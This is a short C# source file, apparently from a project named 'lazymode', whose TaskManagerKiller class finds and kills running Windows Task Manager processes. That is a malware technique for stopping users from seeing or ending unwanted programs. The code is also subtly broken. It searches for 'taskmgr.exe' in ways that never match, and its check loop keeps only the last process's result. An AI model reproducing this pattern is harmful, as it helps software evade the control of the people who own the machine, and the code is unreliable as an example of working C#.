using System.Diagnostics;
using System.Threading.Tasks;
using System.Timers;

namespace lazymode.Tasks
{
    public class TaskManagerKiller
    {
        internal async Task ExecuteAsync()
        {
            if (CheckTaskManager())
            {
                Process[] pList = Process.GetProcessesByName("taskmgr.exe");
                foreach (Process p in pList)
                {
                    p.Kill();
                }
            }
        }

        private static bool CheckTaskManager()
        {
            bool stat = false;
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains("taskmgr.exe"))
                {
                   stat = true;
                }
                else stat = false;
            }
            return stat;
        }
    }
}

